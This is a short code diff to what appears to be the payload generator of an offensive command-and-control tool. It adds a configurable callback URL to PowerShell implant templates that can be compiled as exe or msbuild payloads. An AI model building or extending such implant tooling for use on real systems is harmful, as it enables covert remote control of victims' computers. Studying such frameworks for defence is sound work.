@@ -29,6 +29,7 @@ class Payload:
 
         self.delay = Payload.DEFAULT_DELAY
         self.option = Payload.DEFAULT_TYPE
+        self.callback = ""
 
     def set_type(self, type):
         if type in self.type:
@@ -40,10 +41,16 @@ class Payload:
         except:
             self.delay = Payload.DEFAULT_DELAY
 
+    def set_callback(self, url):
+        if url != "":
+            self.callback = Utils.url_decode(url)
+        else:
+            self.callback = self.get_url()
+
     def get_output(self):
         output = Utils.load_powershell_script(self.type[self.option], 999)
-        output = output.replace('[URL]', self.get_url()).replace('[KEY]', self.config.get('encryption-key')).replace('[DELAY]', str(self.delay))
-        
+        output = output.replace('[URL]', self.callback).replace('[KEY]', self.config.get('encryption-key')).replace('[DELAY]', str(self.delay))
+
         if self.option == "exe":
             output = self.compile_exe(output)
         if self.option == "msbuild":
